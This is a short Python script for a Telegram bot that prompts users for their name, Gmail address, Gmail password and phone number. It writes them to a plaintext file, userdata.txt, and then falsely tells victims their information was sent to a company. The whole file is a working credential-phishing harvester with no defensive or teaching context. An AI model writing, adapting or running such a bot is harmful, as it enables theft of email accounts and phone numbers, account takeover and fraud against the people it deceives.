import telebot

TOKEN = "Enter your token here"  # Replace with your actual bot token
bot = telebot.TeleBot(TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_data[chat_id] = {}
    bot.send_message(chat_id, "Hello! What's your name?")
    bot.register_next_step_handler(message, ask_gmail)

def ask_gmail(message):
    chat_id = message.chat.id
    user_data[chat_id]['name'] = message.text
    bot.send_message(chat_id, "Great! Now, please enter your Gmail ID:")
    bot.register_next_step_handler(message, ask_password)

def ask_password(message):
    chat_id = message.chat.id
    user_data[chat_id]['gmail'] = message.text
    bot.send_message(chat_id, "Now enter your password :")
    bot.register_next_step_handler(message, ask_phone)

def ask_phone(message):
    chat_id = message.chat.id
    user_data[chat_id]['password'] = message.text
    bot.send_message(chat_id, "Finally, enter your phone number:")
    bot.register_next_step_handler(message, save_data)

def save_data(message):
    chat_id = message.chat.id
    user_data[chat_id]['phone'] = message.text

    # Save data to a file
    with open("userdata.txt", "a") as file:
        file.write(f"Name: {user_data[chat_id]['name']}\n")
        file.write(f"Gmail: {user_data[chat_id]['gmail']}\n")
        file.write(f"Password: {user_data[chat_id]['password']}\n")
        file.write(f"Phone: {user_data[chat_id]['phone']}\n")
        file.write("=" * 30 + "\n")

    bot.send_message(chat_id, "Thank you! Your information send to company.")
    del user_data[chat_id]  # Clear stored data for privacy

bot.polling()
